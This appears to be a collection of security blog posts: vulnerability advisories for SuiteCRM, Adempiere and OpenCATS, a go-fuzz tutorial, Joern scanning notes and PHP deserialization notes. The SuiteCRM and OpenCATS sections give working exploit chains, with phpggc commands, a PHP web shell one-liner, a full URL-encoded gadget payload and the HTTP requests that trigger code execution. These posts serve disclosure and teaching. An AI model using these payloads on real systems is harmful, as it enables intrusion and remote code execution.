More about this can be found here: https://docs.joern.io/interpreter. This feature can be useful for mass scanning codebases. The server mode is also useful if you want to build tooling around it https://docs.joern.io/serverJoern ScanningJoern-Scan has a built in scanner which uses community provided queries from https://queries.joern.io/joern-scan --list-languagesWriting logs to: /tmp/joern-scan-log.txtAvailable languages (case insensitive):- golang- fuzzy_test_lang- csharp- java- php- c- kotlin- ghidra- javascript- python- llvm- newc- javasrcNote: Most of the above languages are only available in Ocular (Joern Paid version).To scan a folder run joern-scan /project_to_scanOther commands:  joern-scan --updatedb - Updates built-in query database.  joern-scan /file/to/scan –overwrite - Overwrite existing project CPG, run after application changes.  joern-scan /file/to/scan –tags xss,defaul - Specify queries to run.Instead of using the Joern interpreter, another option is to add your custom query in the correct format, build this querydb locally and use it with joern scan.$ git clone https://github.com/joernio/query-database/$ cd query-databaseadd your query$ ./install.sh$ ./joern-scan /file/to/scanReferences  https://docs.joern.io/  https://github.com/joernio/workshops  https://queries.joern.io"

This advisory details a PHAR deserialization vulnerability that exists in SuiteCRM which could be leveraged by an authenticated administrator to execute commands on the underlying operating system. This issue has been fixed in release 7.11.19.In PHP, PHAR (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses a single file format which can be used to store and execute multiple PHP code. PHAR files contain metadata about the files in the archive. In a PHAR file, this metadata is stored in a serialized format.If a file operation is performed on a PHAR file via the phar:// wrapper, the PHAR file’s metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the unserialize() function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:  A PHP filesystem function such as “file_exists” that can be controlled which will trigger the unserialize() function  The ability to upload a PHAR file with the .phar, .zip, or .jpeg extension to the target system and the path of this file to be knownTechnical Details1) Root CauseThis vulnerability bypasses the security mechanisms implemented by SuiteCRM maintainers as part of their remediation to CVE-2020-8801. As seen in the advisory for CVE-2020-8801, multiple areas within the SuiteCRM administrator panel which includes Backups, Import, and UpgradeWizard areas can be used to trigger PHAR deserialization. This was remediated by the maintainers within release 7.11.13 with commit 571cbfa209da4c8280a5359f301115de25b4c6e3.The strpos function is used to check if a user parameter contains an occurrence of the phar:// URI. However, due to the usage of the strpos function, this check is case-sensitive. As such, it is possible to bypass this check using capital characters and trigger PHAR deserialization by calling the phar wrapper such as PHAR://.2) Finding a usable GadgetWhile it is possible to bypass the SuiteCRM patch for the PHAR URI check, it was found that SuiteCRM maintainers took precautions to ensure that all possible POP gadgets that could be triggered by an attacker using deserialization cannot be used. This was done by adding a __wakeup magic method into classes that were considered to be dangerous. This method is automatically invoked every time an object is being unserialized and ensures that all of the object’s properties are destroyed upon deserialization. An example of this can be seen belowWithin modules/Import/sources/ImportFile.php, a __destruct magic method exists which could be abused to delete arbitrary files from a system through unsafe deserialization. However, due to the presence of the above __wakeup method, this __destruct method cannot be leveraged by an attacker. This check was found throughout SuiteCRM’s codebase.However, a closer look at SuiteCRM’s dependencies, it was possible to find a usable __destruct method that could be leveraged for arbitrary file deletion. SuiteCRM uses the zend-gdata library which uses zf1/zend-http as a transitive dependency.Within the Stream.php file of the zf1/zend-http package, a __destruct method exists which when triggered, will run the @unlink function on the $stream_name property of an object. The @unlink function within this method can be leveraged to delete a file. In order for this function to be triggered, a $_cleanup property should also exist for a given object. The code for this __destruct method can be seen below.https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/library/Zend/Http/Response/Stream.php#L224-L233The existence of this gadget is already known and is available for use within the PHPGGC library. PHPGGC is a library of unserialize() payloads along with a script to generate a POP gadget payload based on user given parameters.Note: If all dev dependencies are also installed within a SuiteCRM installation, a vulnerable release of PHP-CS-Fixer can also be leveraged for Arbitrary FIle Deletion instead of zf1/zend-http. The pull request which integrates this POP gadget to the PHPGGC can be seen here: https://github.com/ambionics/phpggc/pull/933) Finding and Abusing an Upload FunctionalityWhile the advisory for CVE-2020-8801 explains the parameters and the areas within SuiteCRM that can be used for PHAR deserialization, the advisory and the related blog from the researcher who discovered this issue doesn’t state where a PHAR file can be uploaded or what path/location could be leveraged. Furthermore, it was found that any file that is uploaded to SuiteCRM would be renamed to have no extension and the name of this file would be changed to a random UUID identifier. For example, party-parrot.png uploaded as part of a document will be renamed to 51eea769-ce13-40bb-fb25-60197bf855ae.However, after some further walkthrough of all SuiteCRM functionality, it was found that any Module Loader zip uploads do not adhere to this behaviour and module zip uploads are uploaded and saved at an arbitrary location with the .zip extension that can be guessed by an attacker. This can be used to fulfill the requirements of a PHAR deserialization vulnerability. An example of this can be seen below:The uploaded examplemodule.zip file will be stored within the following location. The manifest.php file itself is taken from the module.zip directory and it is also available in the same location.4) Triggering Arbitrary File DeletionWith the path of an uploaded zip file now known, a file deletion gadget being present, and functions that trigger Phar deserialization being available, it is possible to leverage these conditions to exploit a SuiteCRM installation.Using PHPGGC, an example phar file can be created as follows:./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txtThe above command will create a phar file with ZIP format and call it malicious.zip. This will insert a serialized payload of the previously mentioned zf1/zend-http POP gadget and set the $stream_name property of this serialized object to be /tmp/test.txt. Furthermore, the -f option within PHPGGC can also be used to ensure that the serialized object will be destroyed right after the unserialize() call, making the payload more reliable.Note: In order for this zip file to be accepted by the application, an example manifest.php file should also be added to the zip. This can be done as follows within Linux:zip -rv malicious.zip manifest.phpOnce uploaded, this file will now be located in the upload/upgrades/module directory.This file can now be triggered through the Backups section within the SuiteCRM admin panel.5) File Deletion to Code ExecutionBy leveraging file deletion, it is possible to delete application source code files and conduct denial of service attacks. It is also possible to leverage file deletion to execute arbitrary code execution on a SuiteCRM installation by deleting an .htaccess file and accessing uploaded files directly.The .htaccess is a distributed configuration file, and is how Apache handles configuration changes on a per directory basis. Within a SuiteCRM installation, this file disallows the direct access to directories such as /upload and /files. PHAR deserialization can be leveraged to delete this file. Furthermore, the mainfest.php mentioned previously can be used to smuggle and trigger PHP code.When a module is uploaded within the Module loader functionality, SuiteCRM expects a manifest.php to also be present. An example of this can be seen below:By default, SuiteCRM will ensure that the uploaded file must not contain any suspicious function calls such as “exec” or “system”. A full list of the blacklisted function calls can be seen here: Blacklisted FunctionsThis check does not take into account the “include” function. The include function can be used within PHP to include files (local files by default) which are executed as PHP code. So an include function can be smuggled into the manifest file which takes a user parameter (include($_GET[‘p’]);) , an uploaded file (which are renamed by SuiteCRM) can then be provided which contains malicious PHP code to achieve code execution.PHAR deserialization summarySo, to summarize, PHAR deserialization to code execution is as follows:1) Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: &lt;?php echo system($_GET[\"cmd\"]); ?&gt;This is renamed to the file eb7cde01-6190-9ca9-b81b-601998504b41 by the application and stored within the /var/www/html/uploads directory. This UID can be seen in the file URL: http://suitecrm.local/index.php?entryPoint=download&amp;id=eb7cde01-6190-9ca9-b81b-601998504b41&amp;type=Documents1) Upload a ZIP PHAR archive which, when triggered, will delete the .htaccess file and has a manifest.php which contains smuggled PHP code.PHPGGC can be used as follows:./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess The following code can then be added to a manifest.php file and then added to the PHAR ZIP archive.This ZIP archive can then be uploaded to the system using the module loader component.  Trigger the Phar Deserialization by calling the maliciousmodule.zip fileThe Backups area can be used to trigger Phar deserialization. The HTTP request send to the application is as follows:POST /index.php?module=Administration&amp;action=Backups HTTP/1.1Host: suitecrm.localUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 119Origin: http://suitecrm.localConnection: closeReferer: http://suitecrm.local/index.php?module=Administration&amp;action=BackupsCookie: sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; PHPSESSID=6b8f472cd174d02167bc0a0c908ec9e0Upgrade-Insecure-Requests: 1backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmaliciousmodule.zip&amp;backup_zip=s&amp;run=confirm1) Access the malicousmodule manifest file by browsing to the directory path and include the uploaded shell.php.txtNow that the .htaccess file is deleted. The upload directory is accessible. The malcioiusmodule-manifest.php is now accessible as follows:http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.phpThe ?123 can now be specified and the shell.php.txt file can be providedhttp://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41The included shell.php.txt will be interpreted as code, and the cmd parameter can be provided which will be executed by the system command.http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;cmd=idWrapping upTo conclude, when validating user input, precautions should be taken to ensure the checks are not case-sensitive. Furthermore, when remediating and preventing the use of Deserialization gadgets, transitive dependencies should be taken into account since they are loaded by a project through Composer’s autoloading feature. Snyk Open Source also supports PHP scanning and can be used to scan and report on well known libraries that have removed deserialization gadgets in their code."

    "content": "Fuzzing can often be a very useful technical for finding bugs. Go-fuzz is a coverage-guided fuzzing solution for testing of Go packages. go-fuzz. This blog post will walk you through how to use it to find bugs.1) Installing GoOn linux, Go can be quickly installed by the following commands.$ cd /tmp$ ls$ curl -OL https://golang.org/dl/go1.15.12.linux-amd64.tar.gz$ sudo tar -C /usr/local -xvf go1.15.12.linux-amd64.tar.gz$ go version2)  Choosing a targetSome easy ways to find a target for fuzzing can be  https://pkg.go.dev/  https://github.com/trending/go  https://github.com/avelino/awesome-goFor this example, we will fuzz https://github.com/JoshVarga/svgparser3) Building pdf package for fuzzingGo-fuzz can be installed by running the following commandsgo get -u github.com/dvyukov/go-fuzz/go-fuzzgo get -u github.com/dvyukov/go-fuzz/go-fuzz-buildThis installs the latest version of go-fuzz onto your go pathThe svg target we are fuzzing can be installed by go get -u github.com/JoshVarga/svgparser which will install the svg reader onto your go path as well./home/snoopy/gowork/src/github.com/JoshVarga/svgparser❯ ls example_test.go   find.go   find_test.go   fuzz.go   LICENSE   parser.go   parser_test.go   README.md   testutils_test.go   utils❯ This will install the svg package we are fuzzing in our go path, you can now go to this directory and create a new file call fuzz.go which will contain your harness.Within Svgparser, we will try to fuzz the Parse functionhttps://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121To fuzz this function, we can create a fuzz function harness for go-fuzz with the same package name. (Note: your fuzz.go file should be on the same folder as the function you are fuzzing). This function must return 1 if the fuzzer should increase priority of the given input during subsequent fuzzing (for example, the input is lexically correct and was parsed successfully); -1 if the input must not be added to corpus even if gives new coverage; and 0 otherwise; other values are reserved for future use. The Fuzz function must be in a package that go-fuzz can import. This means the code you want to test can’t be in package main. Fuzzing internal packages are also supported.An examples fuzz function for fuzzing can be seen below (which is saved within /home/snoopy/gowork/src/github.com/JoshVarga/svgparser)package svgparserimport (\t\"bytes\")func Fuzz(data []byte) int {\telement,err := Parse(bytes.NewReader(data), false)\tif err != nil {\t\tif element != nil {\t\t\tpanic(\"svg != nil on error\")\t\t}\t\treturn 0\t}\treturn 1}This implements Fuzz(data []byte) function, which is an API expected by go-fuzz. once this has been done, you can go back to your working directory and use go-fuzz-build to build the archive which go-fuzz will use.❯ pwd/home/snoopy/svg_fuzz❯ go-fuzz-build github.com/JoshVarga/svgparser ✗ ls  svgparser-fuzz.zipwhich will produce svgparser-fuzz.zip archive.3) Building a corpusThe next step is to build a corpus for gofuzz to use which will be placed within your working directory. Ideally, files in the corpus are as small as possible and as diverse as possible. You can use inputs used by unit tests, examples and/or generate them manually. Go-fuzz by default will deduplicate and minimize the inputsGo-fuzz will also add own inputs to the corpus directory. Furthermore, the go-fuzz-corpus repository contains a bunch of examples of test functions and initial input corpuses for various packages. https://github.com/dvyukov/go-fuzz-corpus.In this instance, example svg files can be taken from https://github.com/strongcourage/fuzzing-corpusAnother option would be to create an example svg file and use radamsa to mutate the files to create some examples. Gofuzz will also mutate the files given and create more files for your corpusThese files can be taken and copied to a folder called corpus within you fuzzing directory.3) Fuzzinggoing back to your working directory, you can now start gofuzz: go-fuzz -bin=svgparser-fuzz.zip -workdir=. The working directory here should contain a folder corpus with all the svg files your previous found.As long as you don’t delete working directory, you can stop and re-start go-fuzz and it will restart where it stopped. Found crashes will be logged in crashers directory.  workers means number of tests running in parallel (set with -procs flag).  corpus is current number of interesting inputs the fuzzer has discovered, time in brackets says when the last interesting input was discovered  crashers is number of discovered bugs (check out workdir/crashers dir).  restarts is the rate with which the fuzzer restarts test processes.  cover is number of bits set in a hashed coverage bitmap4) Triaging CrashesFor any unique crashes, these will be logged within your crashers directory❯ cd crashers/❯ ls 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7          4465097c05a30de5b06942b3f02e4e196276ae49          88ffb7f7327afe041ac722aaccc9b248b1a12524          c5f797d236f6199102cc91083335469aac76cece 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output   4465097c05a30de5b06942b3f02e4e196276ae49.output   88ffb7f7327afe041ac722aaccc9b248b1a12524.output   c5f797d236f6199102cc91083335469aac76cece.output 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quotedThese will be the format, fuzz input which is the input used to fuzz the file, the .quoted file contains the input quoted as a string and the .output file contains the crash dumpExample:❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7&lt;svg xmlns=\"htt00000000000000000000000\"&gt;00&lt;/svg&gt;0❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted \t\"&lt;svg xmlns=\\\"htt00000\" +\t\"000000000000000000\\\"&gt;\" +\t\"00&lt;/svg&gt;0\"❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output SVG width: panic: runtime error: index out of range [0] with length 0This can then be triaged by creating a small program with the input, and using a go debugger to see the stack properly and what part of the code is crashing.Another option is also to use libfuzzergo-fuzz-build -libfuzzer -o svg.a .go-fuzz-build -libfuzzer -o svg.a .clang -fsanitize=fuzzer svg.a -o fuzz_svg./fuzz_svg corpus_folderFurther Reading  Learning Go-Fuzz 1: iprange  Learning Go-Fuzz 2: goexif2  Going down the rabbit hole with go-fuzz  Introduction to Go fuzzing: fuzz your first project in a few minutes"

    "content": "IntroductionDeserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of serviceJava serialization turns object graphs into byte streams containing the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they may even replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed.Adempiere is vulnerable to unauthenticated Java Deserialization which can result in code execution.Technical Details - AnalysisWithin Adempiere, an unauthenticated deserialization vulnerability exists within MIssue.java. The create method within MIssue.java is used to create and report issue, and the Java.io.ObjectInputStream.readObject() method is used to achieve this without any validation or whitelisting of classes from the datastream.This method is used by IssueReportServlet which takes a user parameter called ISSUE can contain serialized data within ASCII hex encoding.This issuestring data is then sent to the create method for deserialization.Technical Details - ExploitationThis can be leveraged by an attacker for code execution through unsafe deserialization. The following libraries are used by Adempire for various tasks within the project, and as such are availiable within the Java runtime’s classpath.ysoserial is used to speed up the exploitation process

    "content": "IntroductionOpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.Technical DetailsOpenCATS has an activity area to keep track of activities.The following request is being sent to the application as part of a normal application workflow.The parametersactivity:ActivityDataGrid parameter is sending serialized data as seen below which is being deserialized by the application using the unserialize function.a:9:{s:10:\"rangeStart\";i:0;s:10:\"maxResults\";i:15;s:13:\"filterVisible\";b:0;s:9:\"startDate\";s:0:\"\";s:7:\"endDate\";s:0:\"\";s:6:\"period\";s:37:\"DATE_SUB(CURDATE(), INTERVAL 1 MONTH)\";s:6:\"sortBy\";s:15:\"dateCreatedSort\";s:13:\"sortDirection\";s:4:\"DESC\";s:11:\"filterAlpha\";s:1:\"L\";}The unserialize function can be seen in DataGrid.phphttps://github.com/opencats/OpenCATS/blob/develop/lib/DataGrid.php#L272To exploit with vulnerability, a POP gadget chain can be created using guzzlehttp. A __destruct magic method available within /var/www/public/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php can be leveraged to write arbitrary files to the system.The relevant code that needs to be triggered can be seen below:  public function __destruct()    {        $this-&gt;save($this-&gt;filename);    }    /**     * Saves the cookies to a file.     *     * @param string $filename File to save     * @throws \\RuntimeException if the file cannot be found or created     */    public function save($filename)    {        $json = [];        foreach ($this as $cookie) {            /** @var SetCookie $cookie */            if (CookieJar::shouldPersist($cookie, $this-&gt;storeSessionCookies)) {                $json[] = $cookie-&gt;toArray();            }        }        $jsonStr = \\GuzzleHttp\\json_encode($json);        if (false === file_put_contents($filename, $jsonStr)) {            throw new \\RuntimeException(\"Unable to save file {$filename}\");        }    }In the above example, the destruct() magic method calls the save() method on the FileCookieJar class. The save method take a value called filename which is a property of an object, The contents of th is file comes from the $json array which get the value from $cookie-&gt;toArray(), and $cookie being an object.Multiple checks are also done to ensure that $cookie-&gt;getExpires() returns true and $cookie-&gt;getDiscard() returns false. After these checks, The $json array is then json encoded and written to a file using the file_put_contents function.This is an already known gadget found by cf which is available within Guzzle versions 6.0.0 &lt;= 6.3.3+phpggc can be used to generate a serialized exploit payload for this gadgetA payload such as &lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt; can now be used with phpggc to generate a serialized gadget chain which will store shell.php within /var/www/public/shell.php of the target OpenCAT system.💻  📂  🍣 master ❯ ./phpggc -u --fast-destruct Guzzle/FW1 /var/www/public/shell.php  /tmp/shell.php a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7DThe request with the payload can now be sent.GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.12Host: dvws.localUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://dvws.local/index.php?m=activityCookie: _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDkzNjMwNTYsInB0ZyI6eyJjbWY6c2ciOnsiODYwIjoxLCIxMDA3IjoxfSwiX2MiOjE2MDkzNTgwMjEsIl91IjoxNjA5MzU5MzI3fSwiZXhwIjoxNjQwODk5MDU2fQ.OFq8osGBuTAJUengo4LZey2wBuonlgwGBvwJ327pHbQ; _pc_vis=da58a38788948fae; _ga=GA1.2.1963052574.1609358122; sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; Users_divs=Users_aclroles_v%3Dtrue%23undefined%3D%23; ProspectLists_divs=ProspectLists_contacts_v%3Dtrue%23undefined%3D%23ProspectLists_prospects_v%3Dtrue%23; CATS=0cf6e6265f75d23a9abbcf8d70091118Upgrade-Insecure-Requests: 1The shell.php can now be leveraged to execute arbitrary code.Note: Multiple other areas within OpenCATs are also taking deserialized user input which can be leveraged for the same vulnerability.

    "content": "Notes I’ve written and Collected about PHP DeserializationIntroductionserialize and unserializeSerialization functions are commonly used within software to store data to a file, a memory buffer, or transmitted across to another network which can then be deserialized at a later date. Within PHP, The serialize() function can be used to convert a value to an serialized object. This function can be used to convert a value/object to a serialized value. An example of this can be seen below:&lt;?phpclass Test{    public $name = \"Snoopy\";    public $age = 0.1;    public $secret = 0;    public $hobbies = array(\"bughunting\", \"softwaresecurity\");    public $bug_hunter = True;}$object = new Test();$serialized = serialize($object);echo $serialized;?&gt;The serialized form of the above object can be seen asO:4:\"Test\":5:{s:4:\"name\";s:6:\"Snoopy\";s:3:\"age\";d:0.1;s:6:\"secret\";i:0;s:7:\"hobbies\";a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}s:10:\"bug_hunter\";b:1;}This structure can be understood as:  O:Length of Object name :”Class Name”:Number of Properties in Class:{Properties} - O:4:\"Test\":5  { data } - Denotes the data structure of the object with the 5 properties - $name, $age, $secret, $hobbies, $bug_hunter  s:Length of the String:”String Value”; - s:4:\"name\";s:6:\"Snoopy\";  d:Float; - s:3:”age”;d:0.1;`  i:Integer; - s:6:\"secret\";i:0;  a:Number of Elements:{Elements} - a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}  b:boolean; - s:10:\"bug_hunter\";b:1;This can be converted back to an object from using the unserialize() function. unserialize has two parameters:unserialize ( string $data , array $options = [] ) : mixed  The $data parameter takes a serialized string that can be deserialized  The $options array can be used to specify allowed_classes. allowed_classes can be used to whitelist class names that should be accepted. If this is used and unserialize() encounters an object of a class that isn’t to be accepted, then the object will be instantiated as a __PHP_Incomplete_Class instead.&lt;?php$object = 'O:4:\"Test\":5:{s:4:\"name\";s:6:\"Snoopy\";s:3:\"age\";d:0.1;s:6:\"secret\";i:0;s:7:\"hobbies\";a:2:{i:0;s:10:\"bughunting\";i:1;s:16:\"softwaresecurity\";}s:10:\"bug_hunter\";b:1;}';$unserialized = unserialize(var_dump($object));echo $unserialized;?&gt;During deserialization, unserialize will take the user input, this input will have some objects along with the class and the properties of that object, and will create an instance of the provided class and object in memory (Object Instantiation) and creates a copy of the originally serialized object. As per PHP documentation, after successfully reconstructing the object, PHP will automatically attempt to call the the __wakeup() magic method as well (if one exists) and execute code in that function if it is defined for the class. This function can reconstruct any resources that the object may have. The intended use of __wakeup() is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. Once this is done, then the __destruct() magic method of that class will be called to when no reference to the deserialized object instance exists.serialize() will save all properties in the object and the class the object belongs to during serialization but no methods of the class of the object will be stored. As such, when unserialize is triggered, the class of the object will have to be defined in advance in code (definition of the class needs to be present in the file unserialize() is called in), or through autoloading. If the class is not already defined in the file, the object will be instantiated as __PHP_Incomplete_Class, which has no methods.Object InjectionPHP Object Injection/Unserialization happens when untrusted user input is being executed by the unserialize function which can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.This was initially made public by Stefan Esser  https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf  https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf  https://wiki.php.net/rfc/secure_unserializeRequirements for a Successful Exploit  PHP Magic Methods - The codebase/application being exploited needs to have interesting magic methods that can then be triggered through a POP chain.  The POP gadget chain/object being called must be declared during when unserialize is being called ( include() or require()) or object autoloading (through composer (require DIR . '/vendor/autoload.php';) or generic autoloading) must be supported for the target classes when unserialize() is being executedPHP Magic MethodsPHP Magic Methods are PHP classes that have magical properties in PHP. You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them. More about this can be read from here: PHP Magic Methods Documentation. During exploitation, these magic methods can be invoked by crafting a PHP POP gadget. This is because these methods are executed automatically when unserialize() is called on an object.Magic Methods most useful for exploitation  __toString() - Invoked when object is converted to a string. (by echo for example)  __destruct() - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.  __wakeup()\t- Invoked when an object is unserialized. automatically called upon object deserialization.  __call() - will be called if the object will ca1ll an inexistent functionMagic Methods that could be useful for exploitation (Not useful in Most Cases)  __set() - called if the object try to access inexistent class variables  __isset()  __invoke()  __unset()  __set_state()  __callStatic()  __sleep() - called when an object is serialized (with serialize)  __clone()  __get()\t- called if the object try to access inexistent class variables  ` __debugInfo()`  __construct() - Invoked when an object is created (constructor)PHPGCCPHPGGC is a library of unserialize() payloads along with a command-line program. This can be used to generate POP gadgets from known libraries people have already found. PHPGGC supports gadget chains such as CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, WordPress, Yii, and ZendFramework.

The php-object-injection-check burp extension can be used to automate this: https://github.com/securifybv/PHPUnserializeCheck  https://github.com/ricardojba/poi-slinger burp extension can be used to quickly create out of band payloads from PHPGGC during testing.How to PatchUse a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.References/Further Reading  https://notsosecure.com/remote-code-execution-via-php-unserialize/  https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection  https://www.pentestpeople.com/php-deserialisation-object-injection/  https://securitycafe.ro/2015/01/05/understanding-php-object-injection/  https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf  https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html  https://web.archive.org/web/20150317142538/https://scott.arciszewski.me/research/view/php-framework-timing-attacks-object-injection  https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/  https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babyh-master-php-2017  https://github.com/TYPO3/phar-stream-wrapper  https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html  https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missingPhar File FormatPhar (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses single file format which can be used to store and execute multiple PHP code. Phar files contain metadata about the files in the archive. In a phar file, metadata is stored in a serialized formatA structure of a PHAR file is as follow  A stub – which is a PHP code sequence acting as a bootstrapper when the Phar is being run as a standalone application; as a minimum, it must contain the following code:&lt;?php __HALT_COMPILER();  A manifest describing a source file included in the archive; optionally, holds serialized meta-data (this serialized chunk is a critical link in the exploitation chain as we will see further on)  A source file (the actual Phar functionality)  An optional signature, used for integrity checksPhar files can be called using the following URI: zphar://full/or/relative/pathz. Furthermore, a phar file extension doesn’t get checked when declaring a stream, making phar files veritable polyglot candidates. If a filesystem function is called with a phar stream as an argument, the Phar’s serialized metadata automatically gets unserialized, by design. More about the PHP Phar format can be seen here: https://www.php.net/manual/en/book.phar.phpPhar DeserializationDiscovered by Sam Thomas and initially discovered by Orange Tsai (Separately), if a file operation is performed on a phar file via the phar:// wrapper, the phar file’s metadata would be unserialized. As such an attacker could perform PHP object injection without the use of the unserialize() function by uploading a phar file.Sam Thomas’s work can be seen below:  BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Slides  BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It VideoRequirements for a Successful Phar Deserialization  A PHP filesystem function that can be controlled which will trigger unserialize()  The ability to upload a PHAR file to the target system and the path of this file to be knownThe following file system functions can triggerunserialize() by providing a phar:// wrappercopy                file_exists         file_get_contents   file_put_contents   file                fileatime           filectime           filegroup           fileinode           filemtime           fileowner           fileperms           filesize            filetype            fopen               is_dir              is_executable       is_file             is_link             is_readable         is_writable         